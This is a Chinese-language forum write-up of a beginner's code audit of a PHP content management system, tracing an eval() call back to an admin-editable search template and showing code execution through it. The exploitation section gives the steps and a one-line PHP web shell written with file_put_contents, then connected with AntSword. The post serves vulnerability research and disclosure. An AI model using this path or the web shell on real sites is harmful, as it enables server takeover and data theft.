第一次尝试自己审计代码，小白一个。审计了好长时间，终于皇天不负有心人，找到一处模板注入，最终发现一处代码执行。

审计过程：

采用关键函数溯源法来找的。全局搜索eval函数在e/class/connect.php

![image-20200903120718779](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7b0a5201a45e66e257ef9c669bb8b31599142f6a.png)

代码如图所示，能否利用这个eval函数，关键点在于$listtemp和$docode

然后全局搜索ReplaceListVars函数，找的使用这个函数的功能点，在e/search/result/index.php中发现使用了这个函数。如图

![image-20200903122632364](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5e253237bc8a87f73d147969f2ad42161fecdd56.png)

从这里开始再进行回溯，查看参数是否可控。可以看到$listvar和$docode都是从$tempr中得到的，所以回溯$tempr

可以看到$tempr是从数据库中查询得到的，执行哪条查询语句关键在于$search\_r\['tempid'\]

![image-20200903123008456](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6f6c1017cc20b5c2de56016887a1ac1b7584f541.png)

再回溯$search\_r，可以看到$search\_r是从数据库查询到的。

![image-20200903123226779](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dedb993c0c17cf0ea86769ca421ef252c92a606d.png)

我们连接数据库执行查询，看看这个sql的执行结果。

![image-20200903123652096](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5d116b1eaf2ca1c35a1223768b45ebdbafa52ebc.png)

可以看到tempid为1。所以$tempr是执行第一条sql语句查询出来的。这里再执行第一条sql看看

![image-20200903123953139](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0fe49f363a629f69010f7a891eac1731aaf48e0d.png)

如图，listvar就是可以放到eval中执行的字符串，而modid就是控制能否执行eval的$docode。将过程反过来看就是漏洞成因。

而要利用这个漏洞还差一个条件，就是参数可控。所以接下来要找可以插入数据在这里的函数。

全局搜索第一条sql的数据库关键字，在ListSearchtemp.php中发现insert，可以确定这里是新增的地方。

![image-20200903125140913](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-43b3462eb4d2f2b002cf14763694879548c1a47d.png)

在web中找到该页面。可以看到这里显示的模板名称跟之前用sql查询的名字一样，所以可以确定这里就是新增的地方。从页面功能可以看出可以新增和修改，所以eval函数的参数可控。

![image-20200903125657667](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-80e70a259cc86e8ff71e80fe16653e3257feee37.png)

漏洞利用：

![image-20200903130043103](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4f90a75b19a92f4ab9920439fa25e05ddc4d4d59.png)

修改类别内容为phpinfo，同时勾选上使用程序代码。

然后从首页底部的搜索功能，到/e/search/result/index.php

![image-20200903130322867](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d9e6cf6af57d2df8049f480e6c38b02ac5d34d76.png)

![image-20200903130408019](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-970cbd17ac3cd9806766b55b6c0c6f952d7be5c4.png)

用file\_put\_contents函数写入一句话木马payload，然后连接蚁剑：

```php
file_put_contents('test1.php','<?php eval($_POST[cmd]);?>');
```

![image-20200903142710122](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3e7436501193538f4d6600985fadce0b999d3c42.png)

![image-20200903142445589](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-01d823f2ced1ad7c4f03f858c64a22616be91db3.png)